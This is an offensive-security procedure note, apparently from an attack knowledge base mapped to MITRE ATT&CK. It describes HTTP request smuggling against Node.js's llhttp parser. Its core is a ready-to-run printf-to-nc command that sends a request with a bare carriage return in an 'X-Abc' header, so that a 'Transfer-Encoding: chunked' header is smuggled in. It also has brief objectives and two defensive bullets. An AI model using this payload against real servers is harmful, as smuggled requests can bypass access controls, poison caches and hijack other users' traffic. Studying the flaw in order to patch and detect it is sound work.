---
tags:
  - http-smuggling
  - payload-crafting
type: procedure
tools:
  - '[[tools/printf]]'
  - '[[tools/nc]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/send-malformed-http-request]]'
platforms:
  - Web
  - Node.js
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: ec98c444-f254-411f-bda7-c61e6bd5b6d3
created_at: '2025-12-13T09:01:17.227Z'
updated_at: '2025-12-13T09:01:17.227Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send Crafted HTTP Request

## Summary

This procedure crafts and sends a malformed HTTP request to exploit the llhttp parser's vulnerability in Node.js, injecting a header that leads to request smuggling.

## Description

Using printf to format the payload with a CR delimiter in the 'X-Abc' header, followed by piping to nc for transmission to the server. This tricks the parser into interpreting part of the value as a new 'Transfer-Encoding: chunked' header.

## Requirements

1. Running Node.js server on localhost:5000
2. printf and nc tools available
3. Shell access

## Defense

Defensive measures and detection strategies:

- Enforce strict CRLF validation in parsers
- Use WAF to detect malformed headers

## Objectives

1. Exploit parsing flaw for request smuggling
2. Inject smuggling headers
3. Trigger misinterpretation

## Instructions

### Step 1: Craft and Send Payload

**Context**: Generates and transmits the malformed request.

**Command** ([[commands/send-malformed-http-request]]):
```bash
printf "POST / HTTP/1.1\r\nHost: localhost:5000\r\nX-Abc:\rxTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n" | nc localhost 5000
```

> Sends the request, exploiting the CR delimiter acceptance.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/send-malformed-http-request]]

## Tools Used

- [[tools/printf]]
- [[tools/nc]]

## Tags

- [[http-smuggling]]
- [[payload-crafting]]
